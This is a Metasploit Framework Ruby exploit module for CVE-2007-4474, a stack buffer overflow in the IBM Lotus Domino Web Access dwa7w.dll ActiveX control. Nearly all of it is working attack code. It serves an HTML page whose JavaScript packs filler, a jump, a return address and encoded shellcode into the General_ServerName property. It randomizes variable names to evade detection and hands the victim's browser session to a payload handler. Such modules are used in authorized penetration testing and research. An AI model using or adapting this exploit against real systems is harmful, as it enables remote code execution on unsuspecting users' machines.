##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

module Msf

class Exploits::Windows::Browser::IBMLotusDomino_dwa7w < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Lotus Domino Web Access Upload Module dwa7w.dll Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in IBM Lotus Domino Web Access Upload Module. 
					By sending an overly long string to the "General_ServerName()" property located 
					in the dwa7w.dll control, an attacker may be able to execute 
					arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'EB and MC' ], 
			'Version'        => '$Revision$',
			'References'     => 
				[
					[ 'CVE', 'CVE-2007-4474' ],
					[ 'BID', '26972' ],
					[ 'URL', 'http://milw0rm.com/exploits/4820' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'PrepenEncoder' => "\x81\xc4\x54\xf2\xff\xff",	
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'IE 6 SP0-SP2 / Windows XP SP2 Pro English',     { 'Ret' => 0x74c9de3e } ], # 02/07/08  
				],									               # ./msfpescan -i /tmp/oleacc.dll | grep SEHandler
			'DisclosureDate' => 'Dec 20 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
			false
	end

	def check_dependencies
			use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	  = rand_text_alpha(rand(100) + 1)
		strname = rand_text_alpha(rand(100) + 1)
		rand1   = rand_text_alpha(rand(100) + 1)
		rand2   = rand_text_alpha(rand(100) + 1)
		rand3   = rand_text_alpha(rand(100) + 1)
		rand4   = rand_text_alpha(rand(100) + 1)
		rand5   = rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		filler  = Rex::Text.to_unescape(rand_text_alpha(2))
		jmp     = Rex::Text.to_unescape([0x909006EB].pack('V'))
		ret     = Rex::Text.to_unescape([target.ret].pack('V'))
		sc      = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Build out the message
		content = %Q|
		<html>
			<object classid='clsid:E008A543-CEFB-4559-912F-C27C2B89F13B' id='#{vname}'></object>
			<script language='javascript'>
     				#{rand1} = unescape('#{filler}');
					while (#{rand1}.length <= 2461) #{rand1} = #{rand1} + unescape('#{filler}'); 
				#{rand2} = unescape('#{jmp}');
				#{rand3} = unescape('#{ret}');
				#{rand4} = unescape('#{sc}');
				#{strname} = #{rand1} + #{rand2} + #{rand3} + #{rand4};
				#{vname}.General_ServerName = #{strname};
				#{vname}.InstallBrowserHelperDll();
   			</script>
		</html>
		|
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
end
